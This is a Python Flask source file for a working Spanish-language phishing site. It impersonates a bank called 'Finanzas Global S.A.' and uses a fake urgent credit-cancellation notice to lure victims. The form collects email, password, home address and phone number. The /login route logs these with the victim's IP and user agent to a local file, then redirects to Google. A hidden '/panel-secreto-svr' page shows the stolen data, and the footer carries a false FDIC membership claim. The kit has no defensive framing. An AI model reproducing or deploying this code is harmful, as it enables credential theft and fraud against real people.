from flask import Flask, render_template_string, request, redirect, jsonify
import datetime
import random

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cancelación de Crédito | Finanzas Global S.A.</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
        .header { background: #1a252f; color: white; padding: 20px; text-align: center; border-bottom: 4px solid #d32f2f; }
        .container { max-width: 500px; margin: 20px auto; background: white; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }
        .content { padding: 30px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        label { display: block; font-size: 11px; font-weight: bold; color: #666; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .btn { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 10px; }
        .footer-info { font-size: 11px; color: #999; text-align: center; padding: 20px; background: #f8f9fa; }
    </style>
</head>
<body>
    <div class="header">
        <h1 style="margin:0; font-size:24px;">FINANZAS<span>GLOBAL</span></h1>
        <small>DEPARTAMENTO DE SEGURIDAD PATRIMONIAL</small>
    </div>
    <div class="container">
        <div class="content">
            <h3 style="color:#d32f2f; margin-top:0;">⚠️ ACCIÓN REQUERIDA</h3>
            <p style="font-size:13px; color:#444;">Confirme los datos del titular para revocar el crédito <b>#CR-88390</b> por $5,200.00 USD.</p>
            
            <form action="/login" method="post">
                <div class="input-group">
                    <label>Correo Electrónico de Acceso</label>
                    <input type="text" name="u" required placeholder="ejemplo@gmail.com">
                </div>
                <div class="input-group">
                    <label>Contraseña de Seguridad</label>
                    <input type="password" name="p" required placeholder="••••••••">
                </div>
                <hr>
                <div class="input-group">
                    <label>Dirección de Residencia (Asociada a la cuenta)</label>
                    <input type="text" name="dir" placeholder="Calle, Número, Ciudad" required>
                </div>
                <div class="input-group">
                    <label>Teléfono de Verificación</label>
                    <input type="text" name="tel" placeholder="+54 9 ..." required>
                </div>
                <button type="submit" class="btn">VERIFICAR Y CANCELAR PRÉSTAMO</button>
            </form>
        </div>
        <div class="footer-info">
            Sede Central: 200 West St, New York, NY 10282<br>
            © 2026 Finanzas Global S.A. | Member FDIC
        </div>
    </div>
</body>
</html>
"""

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: data = f.read()
    except: data = "Sin capturas."
    return f"<html><body style='background:#000; color:#0f0; padding:20px;'><pre>{data}</pre></body></html>"

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    u, p = request.form.get('u'), request.form.get('p')
    d, t = request.form.get('dir'), request.form.get('tel')
    # Captura extendida con IP y Agent
    log_entry = (f"[{datetime.datetime.now()}]\n"
                 f"USER: {u} | PASS: {p}\n"
                 f"DIR: {d} | TEL: {t}\n"
                 f"IP: {request.remote_addr}\n"
                 f"AGENT: {request.user_agent}\n"
                 f"{'-'*30}\n")
    with open("capturas.txt", "a") as f:
        f.write(log_entry)
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
